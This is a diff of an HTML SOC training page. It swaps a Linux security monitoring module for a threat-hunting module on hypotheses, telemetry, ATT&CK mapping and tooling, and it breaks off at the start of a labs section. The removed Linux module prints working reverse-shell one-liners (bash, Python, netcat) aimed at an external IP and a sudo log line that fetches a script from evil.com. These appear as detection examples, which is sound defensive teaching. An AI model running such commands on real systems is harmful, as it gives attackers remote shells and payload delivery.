@@ -1,111 +1,708 @@
-<div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-success mb-3"><i class="bi bi-book me-2"></i>Module 10: Linux Security Monitoring</h6>
+<div class="topic-container">
+  <h2 class="topic-title"><i class="bi bi-binoculars"></i> Module 10: Threat Hunting</h2>
+  <p class="topic-subtitle">Proactively search for threats that evade existing security controls using hypothesis-driven methodologies.</p>
 
-<p style="color:#c0d0e0;">Linux powers most servers and cloud infrastructure. SOC analysts need to understand Linux logging, detect compromises, and investigate incidents on Linux systems.</p>
+  <!-- SECTION OVERVIEW -->
+  <div class="section-card">
+    <h3><i class="bi bi-eye"></i> SECTION OVERVIEW</h3>
+    <p><strong>What is Threat Hunting?</strong> Threat hunting is the proactive and iterative search for cyber threats that have evaded existing security controls. Unlike incident response (reactive), threat hunting assumes a breach has already occurred and actively searches for indicators of compromise and adversary behaviors.</p>
+    <p><strong>Why It Matters in a SOC:</strong> Detection-only SOCs miss advanced threats. Mature SOCs spend 30-40% of analyst time on proactive hunting. Hunts uncover stealthy malware, living-off-the-land attacks, insider threats, and zero-day exploits that signature-based tools cannot detect.</p>
+    <p><strong>Real-World Use Cases:</strong> Hunt for Cobalt Strike beacons in HTTPS traffic, detect Log4j exploitation in internal systems, find persistence mechanisms after a suspected breach, uncover data exfiltration via DNS tunneling, identify compromised service accounts performing lateral movement.</p>
+    <p><strong>Skills Gained:</strong> Hypothesis formulation, data analysis (Pandas, KQL, SPL), MITRE ATT&CK mapping, log telemetry analysis (Sysmon, EDR, DNS, proxy), statistical and baseline analysis, custom detection rule writing, adversarial simulation techniques.</p>
+    <p><strong>Prerequisites:</strong> Strong understanding of Windows/Linux internals, networking protocols, common attack techniques, SIEM query languages (SPL/KQL), log sources and formats, and the MITRE ATT&CK framework.</p>
+    <p><strong>Learning Objectives:</strong>
+      <ul>
+        <li>Formulate and test threat hunting hypotheses based on threat intelligence</li>
+        <li>Use the Pyramid of Pain to prioritize hunt targets</li>
+        <li>Leverage Sysmon, EDR, DNS, and proxy logs for hunting</li>
+        <li>Apply statistical baselining to identify anomalies</li>
+        <li>Create Sigma rules from hunt findings</li>
+      </ul>
+    </p>
+  </div>
 
-<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
+  <!-- DETAILED NOTES -->
+  <div class="section-card">
+    <h3><i class="bi bi-journal-text"></i> DETAILED NOTES</h3>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Linux Logging for SOC</p>
-<p style="color:#c0d0e0;">Linux logs are the primary source of forensic data on Linux servers. Understanding where to look and what to look for is critical.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Critical Linux Log Files:</b><br><br>
-| Log File | Purpose | Key Things to Look For |
-|----------|---------|----------------------|
-| /var/log/auth.log | Authentication events | SSH logins, sudo usage, user additions |
-| /var/log/secure | RedHat auth events | Same as auth.log but for RHEL/CentOS |
-| /var/log/syslog | System events | Kernel messages, service starts/stops |
-| /var/log/messages | General system log | Hardware errors, systemd events |
-| /var/log/kern.log | Kernel messages | Module loading, driver issues |
-| /var/log/httpd/ | Apache web server logs | Web attacks, suspicious requests |
-| /var/log/nginx/ | Nginx web server logs | Same as Apache |
-| ~/.bash_history | User command history | All commands the user ran |
-| /var/log/cron | Cron job execution | Scheduled task activity |
-| audit.log | Linux Audit Daemon | System call auditing, file access |
-</div>
+    <h4>Subtopic 1: Threat Hunting Methodology</h4>
+    <p><strong>Technical Breakdown:</strong> Threat hunting follows a structured process to ensure consistency and repeatability. The three primary models are:</p>
+    <ul>
+      <li><strong>Hypothesis-Driven Hunting:</strong> Based on threat intelligence, recent vulnerabilities, or TTPs. Example hypothesis: "Attackers are exploiting Log4j (CVE-2021-44228) internally. I will hunt for LDAP/HTTP outbound connections from Java processes." Steps: Gather intel, formulate hypothesis, collect data, analyze, document findings.</li>
+      <li><strong>IoC-Based Hunting:</strong> Search for known indicators (hashes, IPs, domains) across historical data. While reactive, it's useful when intel feeds provide new IOCs. Example: "New C2 IP 185.220.101.x added to intel feed. Hunt for any connections to this IP in the last 30 days."</li>
+      <li><strong>TTP-Based Hunting:</strong> Search for adversary behaviors (MITRE ATT&CK techniques) rather than specific IOCs. Most effective because attackers can change IOCs but not TTPs easily. Example: "Hunt for Regsvr32.exe executing DLLs from user-writable paths (T1218.010) — potential bypass technique."</li>
+    </ul>
+    <p><strong>Architecture:</strong> A hunting environment requires: Centralized log repository (ELK/Splunk), EDR platform with API access (CrowdStrike/Defender for Endpoint), threat intelligence platform (MISP/ThreatConnect), data science tools (Jupyter Notebooks with Pandas/NumPy for large-scale log analysis), and visualization tools (Kibana/Grafana).</p>
+    <p><strong>Enterprise Example:</strong> A SOC team conducts weekly hypothesis-driven hunts based on the latest CISA alerts. A recent hunt based on "CISA Alert AA24-123A: APT40 Exploiting Public-Facing Applications" led to the discovery of a web shell on an unpatched IIS server that had been undetected for 47 days.</p>
 
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Useful Linux SOC Commands:</b><br>
-<code>last</code> — Show all recent logins (reads /var/log/wtmp)<br>
-<code>lastb</code> — Show failed login attempts (reads /var/log/btmp)<br>
-<code>who /var/log/wtmp</code> — Display wtmp in human-readable format<br>
-<code>ausearch -m LOGIN -i</code> — Query audit logs for login events<br>
-<code>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</code><br>
-→ Count failed SSH login attempts by source IP<br>
-<code>grep "Accepted" /var/log/auth.log | grep -v "127.0.0.1"</code><br>
-→ Show all successful remote logins
-</div>
+    <h4>Subtopic 2: Data Sources & Telemetry</h4>
+    <p><strong>Technical Breakdown:</strong> Effective hunting requires high-quality telemetry. Key data sources and what they reveal:</p>
+    <ul>
+      <li><strong>Sysmon (Event ID 1-255):</strong> Process creation (EID 1), network connections (EID 3), file creation (EID 11), registry modification (EID 12-14), named pipe creation (EID 17-18), DNS queries (EID 22). Essential for detecting LOLBins, lateral movement, persistence.</li>
+      <li><strong>EDR Telemetry:</strong> Full process tree (parent-child relationships), file system activity, registry changes, network connections, script execution (PowerShell, VBScript, JavaScript), driver loading, service creation. Examples: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne.</li>
+      <li><strong>DNS Logs:</strong> DNS queries to suspicious domains (DGA domains, lookalike domains, parked domains). High volume of NXDOMAIN responses indicates DGA activity. Large TXT record queries indicate DNS tunneling.</li>
+      <li><strong>Proxy Logs:</strong> Outbound web traffic. Unusual User-Agent strings, connections to newly registered domains, connections to cloud storage services (Dropbox, Google Drive) from non-business applications, unusual traffic volumes.</li>
+      <li><strong>Windows Event Logs:</strong> Security log (4624/4625 - logons), System log (7045 - service install), Application log (errors from suspicious applications), PowerShell Operational (4103/4104 - script block logging).</li>
+      <li><strong>Authentication Logs:</strong> VPN logins, RADIUS logs, cloud identity provider logs (Azure AD Sign-in logs, Okta system log). For detecting brute force, password spray, MFA fatigue attacks.</li>
+    </ul>
+    <p><strong>Real-World Example:</strong> A threat hunter uses Sysmon EID 22 (DNS query) to hunt for Cobalt Strike DNS beacons. Filter for DNS queries to domains with high entropy (DGA), abnormal TXT record length, or DNS query intervals of exactly 60 seconds (beaconing behavior).</p>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 1: SSH Brute Force & Sudo Abuse</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>SSH Brute Force Detection:</b><br>
-<code>May 21 14:32:15 web-server sshd[12345]: Failed password for root from 45.33.32.156 port 54321 ssh2<br>
-May 21 14:32:16 web-server sshd[12346]: Failed password for root from 45.33.32.156 port 54322 ssh2<br>
-May 21 14:32:17 web-server sshd[12347]: Failed password for root from 45.33.32.156 port 54323 ssh2<br>
-... (500+ entries)<br>
-May 21 14:37:15 web-server sshd[12845]: Accepted password for root from 45.33.32.156 port 54821 ssh2</code><br>
-→ 500 failed attempts followed by success = brute force succeeded. Actions: check what the attacker did, rotate root password, disable root SSH login, deploy Fail2Ban.<br><br>
-<b>Sudo Abuse Detection:</b><br>
-<code>grep "sudo" /var/log/auth.log<br>
-May 21 14:38:00 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash<br>
-May 21 14:38:15 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/tools.sh<br>
-May 21 14:38:30 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/tools.sh</code><br>
-→ User "victim" (compromised account) escalated to root and downloaded malicious tools. The auditd rule alerting on sudo use would catch this immediately.
-</div>
+    <h4>Subtopic 3: TTP Mapping & MITRE ATT&CK</h4>
+    <p><strong>Technical Breakdown:</strong> MITRE ATT&CK provides a common taxonomy for adversary behavior. Hunters map observed behaviors to techniques to understand the attack lifecycle and identify gaps in detection coverage.</p>
+    <ul>
+      <li><strong>Initial Access (TA0001):</strong> Hunt for spear-phishing (T1566), exploitation of public-facing applications (T1190), external remote services (T1133). Example: Hunt for unusual RDP connections from non-company IPs to non-admin workstations.</li>
+      <li><strong>Execution (TA0002):</strong> Hunt for PowerShell (T1059.001), WMI (T1047), scheduled tasks (T1053.005), service execution (T1569.002). Example: Hunt for wmic.exe creating processes remotely — potential lateral movement.</li>
+      <li><strong>Persistence (TA0003):</strong> Hunt for registry Run keys (T1547.001), startup folders (T1547.001), scheduled tasks (T1053.005), service creation (T1543.003), DLL search order hijacking (T1574.001). Example: Hunt for new services created with ImagePath pointing to non-system32 paths.</li>
+      <li><strong>Defense Evasion (TA0005):</strong> Hunt for DLL sideloading (T1574.002), process injection (T1055), masquerading (T1036), disabling security tools (T1562.001), obfuscated PowerShell (T1027). Example: Hunt for svchost.exe running from a non-standard path.</li>
+      <li><strong>Credential Access (TA0006):</strong> Hunt for LSASS dump (T1003.001), credential harvesting from web browsers, keylogging, Kerberoasting (T1558.003). Example: Hunt for Task Manager dumping LSASS via comsvcs.dll.</li>
+      <li><strong>Lateral Movement (TA0008):</strong> Hunt for RDP (T1021.001), SMB/Windows Admin Shares (T1021.002), PSExec (T1570), SSH (T1021.004), pass-the-hash (T1550.002). Example: Hunt for anomalous admin share access from workstations.</li>
+      <li><strong>Command and Control (TA0011):</strong> Hunt for beaconing (T1071.001), domain generation algorithms (T1568.002), DNS tunneling (T1572), web shell communications. Example: Hunt for HTTP POST requests to non-corporate URLs where the payload size matches C2 beacon intervals.</li>
+    </ul>
+    <p><strong>Enterprise Example:</strong> After the SolarWinds attack, SOC teams globally hunted for T1195.001 (Supply Chain Compromise) by searching for SolarWinds Orion binary hashes, suspicious service account logins from Orion servers, and unusual DNS queries from Orion management nodes.</p>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 2: Reverse Shells & Persistence</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Reverse Shell Detection:</b><br>
-Check for unusual network connections:<br>
-<code>ss -tulpn | grep ESTABLISHED<br>
-Proto Recv-Q Send-Q Local Address           Foreign Address         State<br>
-tcp   ESTAB  0      0    10.0.1.50:443        45.33.32.156:4444      ESTABLISHED</code><br>
-→ A web server should accept connections (LISTEN), not establish outbound connections to suspicious IPs<br><br>
-<b>Common Reverse Shell Commands (detect in bash_history):</b><br>
-<code>bash -i >& /dev/tcp/45.33.32.156/4444 0>&1</code> — Classic bash reverse shell<br>
-<code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("45.33.32.156",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code><br>
-<code>nc -e /bin/sh 45.33.32.156 4444</code> — Netcat reverse shell<br><br>
-<b>Linux Persistence Detection:</b><br>
-1. <b>Cron jobs:</b> Check /var/spool/cron/crontabs/ and /etc/cron.d/ for unexpected entries<br>
-<code>*/5 * * * * /tmp/.hidden/update.sh</code> — Runs every 5 minutes from /tmp<br>
-2. <b>Systemd services:</b> Check /etc/systemd/system/ for new service files<br>
-<code>[Service]<br>ExecStart=/tmp/.hidden/malware<br>Restart=always</code><br>
-3. <b>SSH authorized_keys:</b> Check ~/.ssh/authorized_keys for unexpected public keys<br>
-4. <b>LD_PRELOAD:</b> Check /etc/ld.so.preload for suspicious library loading<br>
-5. <b>.bashrc/.profile:</b> Check for commands that execute on login
-</div>
+    <h4>Subtopic 4: Automation & Tooling</h4>
+    <p><strong>Technical Breakdown:</strong> Modern threat hunting leverages automation for scalability.</p>
+    <ul>
+      <li><strong>Velociraptor:</strong> Open-source endpoint visibility platform. Dig Deploy Velociraptor agents across endpoints. Use VQL queries to collect artifacts (prefetch, registry, event logs, MFT) across thousands of hosts simultaneously. Great for finding IOCs at scale.</li>
+      <li><strong>KAPE (Kroll Artifact Parser and Extractor):</strong> Targeted collection of forensic artifacts. Collect and parse over 200+ artifacts in minutes. Combine with Velociraptor for remote collection.</li>
+      <li><strong>Sigma Rules:</strong> Generic detection rule format. Convert Sigma rules to SIEM queries for proactive hunting. Use Sigma CLI to convert to Splunk, Elastic, QRadar, etc.</li>
+      <li><strong>Jupyter Notebooks & Pandas:</strong> Analyze large log datasets. Statistical analysis, anomaly detection, machine learning for outlier detection. Can process millions of events in seconds.</li>
+      <li><strong>Detection-as-Code:</strong> Store detection rules in Git, version control, peer review, CI/CD pipeline testing. Tools: Sigma CLI, KQL, SPL, Elastic Rules API, PySigma.</li>
+      <li><strong>YARA & YARA-X:</strong> Scan files for malware patterns. Hunt for malware in network shares, email attachments, web downloads. YARA-X is the next-gen rewrite with better performance.</li>
+    </ul>
+    <p><strong>Common Attacks – Detection/Investigation/Response:</strong>
+      <ul>
+        <li><strong>Living Off the Land (LOLBins):</strong> Detect via Sysmon EID 1 + command-line logging for suspicious binaries (powershell.exe, wmic.exe, regsvr32.exe, rundll32.exe, mshta.exe, certutil.exe). Investigate by reviewing the process tree — what executed the LOLBin and what did it execute? Respond by blocking execution policies, removing unnecessary tools, application whitelisting.</li>
+        <li><strong>Fileless Malware:</strong> Detect via PowerShell script block logging (EID 4104), WMI subscription events, registry Run key entries pointing to encoded commands. Investigate by extracting decoded PowerShell scripts, reviewing registry for WMI persistence, checking process memory for injected code. Respond by disabling PowerShell v2, enabling Constrained Language Mode, deploying AMSI bypass detection.</li>
+        <li><strong>DGA and DNS Tunneling:</strong> Detect via DNS log analysis: high NXDOMAIN rate, high entropy domain names, unusual TXT record sizes, consistent query intervals. Investigate by extracting DGA domains, reverse engineering the DGA algorithm (if possible), checking affected hosts for C2 connections. Respond by sinkholing DGA domains, blocking DNS tunneling patterns at the DNS firewall.</li>
+      </ul>
+    </p>
+  </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 3: Rootkits & Kernel Threats</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Rootkit Detection:</b><br>
-Rootkits hide their presence by modifying system binaries or kernel modules.<br><br>
-<b>Symptoms:</b><br>
-- ls, ps, netstat show different results than expected<br>
-- System files have different sizes/checksums than known-good versions<br>
-- Kernel modules loaded that don't appear in any package database<br>
-- Hidden processes visible via /proc but not via ps command<br><br>
-<b>Detection Tools:</b><br>
-<code>chkrootkit</code> — Check for known rootkit signatures<br>
-<code>rkhunter</code> — Rootkit hunter — checks file hashes, hidden ports, suspicious binaries<br>
-<code>aide</code> — Advanced Intrusion Detection Environment — file integrity checking<br>
-<code>unhide</code> — Detect hidden processes by comparing /proc with ps output<br><br>
-<b>Example — Kernel Module Rootkit:</b><br>
-<code>lsmod | grep -i "hide\|rootkit\|sneaky"</code><br>
-<code>cat /proc/modules | grep -v "$(lsmod | cut -d' ' -f1)"</code><br>
-→ Look for kernel modules that don't appear in lsmod output<br><br>
-<b>Privilege Escalation (CVE-2021-4034 — PwnKit):</b><br>
-<code>pkexec --version</code> — Check vulnerable version<br>
-<code>journalctl -u pkexec --since "2021-01-01"</code><br>
-→ Check logs for pkexec exploitation attempts. The exploit triggers an out-of-bounds write that gives root shell.
-</div>
+  <!-- CONCEPT BOXES -->
+  <div class="section-card">
+    <h3><i class="bi bi-boxes"></i> CONCEPT BOXES</h3>
 
-<h6 class="text-success mt-3">Linux Incident Response Checklist</h6>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-1. <b>Isolate the host:</b> Disconnect from network to prevent further damage or exfiltration<br>
-2. <b>Collect volatile data:</b> Running processes (ps aux), network connections (ss -tulpn), logged-in users (who), uptime<br>
-3. <b>Collect persistent data:</b> auth.log, bash_history, cron jobs, systemd services, SSH keys<br>
-4. <b>Check for rootkits:</b> Run chkrootkit, rkhunter, check kernel modules<br>
-5. <b>Analyze timeline:</b> Use the logs to determine when the compromise occurred and what actions were taken<br>
-6. <b>Preserve evidence:</b> Use dd or LiME to capture memory, tar -czf for disk evidence<br>
-7. <b>Remediation:</b> Patch vulnerability, rotate credentials, remove persistence, reimage if needed
-</div>
+    <div class="alert alert-info">
+      <strong>INFO BOX</strong><br>
+      The Pyramid of Pain (David Bianco) illustrates how difficult it is for attackers to change different types of IOCs. From bottom (easiest for attackers to change) to top (hardest): Hash values ➡ IP addresses ➡ Domain names ➡ Host artifacts ➡ Network artifacts ➡ Tools ➡ TTPs. Hunt for TTPs — they are the hardest for adversaries to change.
+    </div>
+
+    <div class="alert alert-success">
+      <strong>REMEMBER BOX</strong><br>
+      "Assume breach" is the foundational mindset of threat hunting. Don't wait for alerts — go looking for trouble. The best hunts often find threats that have been present for weeks or months. If you're not finding anything, either your telemetry is insufficient or you're not looking hard enough.
+    </div>
+
+    <div class="alert alert-warning">
+      <strong>WARNING BOX</strong><br>
+      Hunting without a hypothesis or plan is "random clicking" — it wastes time and produces unreliable results. Always start with a clear hypothesis based on threat intelligence, recent vulnerabilities, or known adversary TTPs. Document your hunting methodology so findings can be reproducible and defensible.
+    </div>
+
+    <div class="alert alert-info">
+      <strong>SOC ANALYST TIP</strong><br>
+      Build "hunting baselines" for your environment. Learn normal before you can spot abnormal. Track peak traffic times, typical PowerShell usage patterns, common User-Agent strings, normal DNS query volumes. Tools like Elastic's Machine Learning or Splunk's Statistical Analysis can auto-build baselines. When you know what "normal" looks like, anomalies jump out.
+    </div>
+
+    <div class="alert alert-warning">
+      <strong>INTERVIEW Q&A</strong><br>
+      <strong>Q:</strong> "How do you prioritize which hypotheses to hunt for?"<br>
+      <strong>A:</strong> "I prioritize based on a risk-score approach: (1) Relevance to my organization — what's our industry, threat landscape, attack surface? A retail company hunts for credit card skimmers; a defense contractor hunts for APT groups. (2) Current threat intelligence — CISA alerts, vendor intel, sector-specific threat reports. (3) Gaps in current detection coverage — what techniques can we not detect? (4) Recency — what new vulnerabilities or TTPs are being exploited in the wild? I also look at the MITRE ATT&CK coverage score for our SOC and prioritize techniques with low detection coverage."
+    </div>
+  </div>
+
+  <!-- VISUAL DIAGRAMS -->
+  <div class="section-card">
+    <h3><i class="bi bi-diagram-3"></i> VISUAL DIAGRAMS</h3>
+    <p><strong>Threat Hunting Process Flow:</strong></p>
+    <pre class="mermaid">
+      flowchart TD
+        A[Threat Intelligence] --> B[Formulate Hypothesis]
+        C[Vulnerability Disclosures] --> B
+        D[Previous Incident Lessons] --> B
+        B --> E[Collect Required Data]
+        E --> F{Data Available?}
+        F -->|No| G[Enable Additional Logging]
+        G --> E
+        F -->|Yes| H[Apply Hunt Analytics]
+        H --> I{Suspicious Findings?}
+        I -->|Yes| J[Deep Investigation]
+        J --> K{Malicious?}
+        K -->|Yes| L[Create Incident]
+        K -->|No| M[Document as Benign]
+        I -->|No| N[Document & Continue Monitoring]
+        L --> O[Update Detection Rules]
+        M --> O
+        N --> O
+        O --> P[Update Threat Intel]
+        P --> A
+    </pre>
+
+    <p><strong>Pyramid of Pain:</strong></p>
+    <pre class="mermaid">
+      flowchart TD
+        subgraph Pyramid [Pyramid of Pain]
+          TTPs[TTPs - Hardest]:::top
+          Tools[Tools]
+          NwArtifacts[Network Artifacts]
+          HostArtifacts[Host Artifacts]
+          Domains[Domain Names]
+          IPs[IP Addresses]
+          Hashes[Hash Values - Easiest]:::bottom
+        end
+        Hashes --> IPs
+        IPs --> Domains
+        Domains --> HostArtifacts
+        HostArtifacts --> NwArtifacts
+        NwArtifacts --> Tools
+        Tools --> TTPs
+        classDef top fill:#ff4444,color:#fff
+        classDef bottom fill:#44ff44,color:#000
+    </pre>
+
+    <p><strong>Data Source Prioritization Matrix:</strong></p>
+    <pre class="mermaid">
+      flowchart LR
+        subgraph Sources [Threat Hunting Data Sources]
+          Sysmon[Sysmon Telemetry]:::high
+          EDR[EDR Platform]:::high
+          DNS[DNS Logs]:::high
+          Proxy[Proxy Logs]:::high
+          EVTX[Windows Event Logs]:::medium
+          NetFlow[NetFlow/IPFIX]:::medium
+          Email[Email Gateway Logs]:::medium
+          Cloud[Cloud Audit Logs]:::medium
+          App[App Server Logs]:::low
+          VPN[VPN Logs]:::low
+        end
+        classDef high fill:#00d4ff,color:#000
+        classDef medium fill:#ffaa00,color:#000
+        classDef low fill:#888888,color:#fff
+    </pre>
+  </div>
+
+  <!-- TRYHACKME SECTION -->
+  <div class="section-card">
+    <h3><i class="bi bi-activity"></i> TRYHACKME</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Room Name</th>
+            <th>Difficulty</th>
+            <th>Objectives</th>
+            <th>Completion Order</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Introduction to Threat Hunting</td>
+            <td><span class="badge bg-success">Easy</span></td>
+            <td>Understand threat hunting concepts, models, and basic techniques</td>
+            <td>1</td>
+          </tr>
+          <tr>
+            <td>Threat Hunting with Jupyter</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Use Pandas DataFrames to analyze log data, detect anomalies, visualize findings</td>
+            <td>2</td>
+          </tr>
+          <tr>
+            <td>We find the Threats (WfT)</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Hunt for real threats using multiple log sources, correlate findings, build timeline</td>
+            <td>3</td>
+          </tr>
+          <tr>
+            <td>YARA Analysis</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Write YARA rules to detect malware families, scan memory/file samples</td>
+            <td>4</td>
+          </tr>
+          <tr>
+            <td>Sigma: The Generic Signature Format</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Write Sigma rules, convert to SIEM queries, validate detection</td>
+            <td>5</td>
+          </tr>
+          <tr>
+            <td>Advanced Threat Hunting</td>
+            <td><span class="badge bg-danger">Hard</span></td>
+            <td>Conduct full hunt cycle from hypothesis to detection rule creation</td>
+            <td>6</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- HACK THE BOX ACADEMY SECTION -->
+  <div class="section-card">
+    <h3><i class="bi bi-cpu"></i> HACK THE BOX ACADEMY</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Module Name</th>
+            <th>Difficulty</th>
+            <th>Outcomes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Threat Hunting Fundamentals</td>
+            <td><span class="badge bg-success">Easy</span></td>
+            <td>Understand the hunting loop, formulate hypotheses, apply the Pyramid of Pain</td>
+          </tr>
+          <tr>
+            <td>Windows Forensics for Hunters</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Analyze NTFS artifacts, Prefetch, Jump Lists, ShimCache, AmCache for threat hunting</td>
+          </tr>
+          <tr>
+            <td>Hunting with Sysmon & Event Logs</td>
+            <td><span class="badge bg-warning text-dark">Medium</span></td>
+            <td>Master Sysmon configuration, event analysis, hunt for LOLBins and lateral movement</td>
+          </tr>
+          <tr>
+            <td>Active Directory Attack Detection</td>
+            <td><span class="badge bg-danger">Hard</span></td>
+            <td>Detect Kerberoasting, AS-REP roasting, DCSync, Golden Ticket, ACL abuse techniques</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- LETSDEFEND SECTION -->
+  <div class="section-card">
+    <h3><i class="bi bi-shield-check"></i> LETSDEFEND</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Scenario Name</th>
+            <th>Description</th>
+            <th>Skills Tested</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>DNS Tunneling Hunt</td>
+            <td>Identify DNS tunneling activity using DNS log analysis and entropy calculations</td>
+            <td>DNS log analysis, entropy calculation, threat hunting methodology</td>
+          </tr>
+          <tr>
+            <td>Lateral Movement Detection</td>
+            <td>Hunt for lateral movement using RDP, SMB, and PowerShell remoting logs</td>
+            <td>Network log analysis, protocol analysis, event correlation</td>
+          </tr>
+          <tr>
+            <td>PowerShell Abuse Hunt</td>
+            <td>Detect obfuscated PowerShell scripts, encoded commands, and script block logging bypass</td>
+            <td>PowerShell analysis, AMSI bypass detection, deobfuscation</td>
+          </tr>
+          <tr>
+            <td>Living Off the Land Hunt</td>
+            <td>Hunt for LOLBins (wmic, certutil, mshta, regsvr32) used maliciously in the environment</td>
+            <td>Process tree analysis, LOLBins knowledge, command-line analysis</td>
+          </tr>
+          <tr>
+            <td>Beaconing Detection Hunt</td>
+            <td>Find C2 beaconing patterns in network traffic using time-series analysis</td>
+            <td>Network traffic analysis, beacon detection algorithms, statistical analysis</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- CYBERDEFENDERS SECTION -->
+  <div class="section-card">
+    <h3><i class="bi bi-lock"></i> CYBERDEFENDERS</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Lab Name</th>
+            <th>Description</th>
+            <th>Focus Area</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Threat Hunting Lab — Beaconing Detection</td>
+            <td>Use Elastic Stack to analyze network logs and identify C2 beaconing patterns</td>
+            <td>Network Hunting, Beacon Analysis</td>
+          </tr>
+          <tr>
+            <td>Enterprise Threat Hunt</td>
+            <td>Full enterprise hunt scenario covering multiple log sources and attack techniques</td>
+            <td>Comprehensive Hunting, Log Correlation</td>
+          </tr>
+          <tr>
+            <td>YARA Rule Development Lab</td>
+            <td>Create, test, and deploy YARA rules for custom threat hunting</td>
+            <td>YARA, Detection Engineering</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- GITHUB RESOURCES -->
+  <div class="section-card">
+    <h3><i class="bi bi-github"></i> GITHUB RESOURCES</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Repository</th>
+            <th>Description</th>
+            <th>Purpose</th>
+            <th>Skills Learned</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><a href="https://github.com/keraattin/Blue-Team-Roadmap" target="_blank" class="text-cyan">Blue-Team-Roadmap</a></td>
+            <td>Comprehensive roadmap for blue team skills including threat hunting</td>
+            <td>Career planning, skill gap analysis for hunters</td>
+            <td>Hunting skill development path</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/cyb3rxp/awesome-soc" target="_blank" class="text-cyan">awesome-soc</a></td>
+            <td>Curated list of SOC tools including threat hunting platforms</td>
+            <td>Tool discovery, hunting platform reference</td>
+            <td>Hunting tool ecosystem knowledge</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/SigmaHQ/sigma" target="_blank" class="text-cyan">Sigma</a></td>
+            <td>Generic signature format for SIEM systems — critical for hunting rule creation</td>
+            <td>Write and share hunting rules, convert to SIEM queries</td>
+            <td>Sigma rule writing, detection engineering</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/redcanaryco/atomic-red-team" target="_blank" class="text-cyan">Atomic Red Team</a></td>
+            <td>Atomic tests mapped to MITRE ATT&CK — validate hunting coverage</td>
+            <td>Test detection coverage, run atomic tests to validate hunts</td>
+            <td>Attack simulation, detection validation</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/SwiftOnSecurity/sysmon-config" target="_blank" class="text-cyan">sysmon-config</a></td>
+            <td>High-quality Sysmon configuration for maximum hunting telemetry</td>
+            <td>Deploy optimal Sysmon config for endpoint visibility</td>
+            <td>Sysmon tuning, telemetry optimization</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/aboutsecurity/blueteam_homelabs" target="_blank" class="text-cyan">blueteam_homelabs</a></td>
+            <td>Blue team home lab setups with hunting environment guidance</td>
+            <td>Build lab for practicing hunt techniques</td>
+            <td>Lab deployment, hunting practice</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES" target="_blank" class="text-cyan">EVTX-ATTACK-SAMPLES</a></td>
+            <td>Windows Event Log samples for various attacks — excellent hunting practice data</td>
+            <td>Practice hunting with real attack event logs</td>
+            <td>Event log analysis, hunting pattern recognition</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/InQuest/awesome-yara" target="_blank" class="text-cyan">awesome-yara</a></td>
+            <td>Curated YARA resources and rules for file/memory hunting</td>
+            <td>Create YARA rules for custom threat hunting signatures</td>
+            <td>YARA rule creation, malware pattern detection</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/A-poc/BlueTeam-Tools" target="_blank" class="text-cyan">BlueTeam-Tools</a></td>
+            <td>Blue team tools collection including Velociraptor, KAPE, and hunting frameworks</td>
+            <td>Tool familiarity for hunting workflows</td>
+            <td>Hunting tool proficiency</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- HANDS-ON LABS -->
+  <div class="section-card">
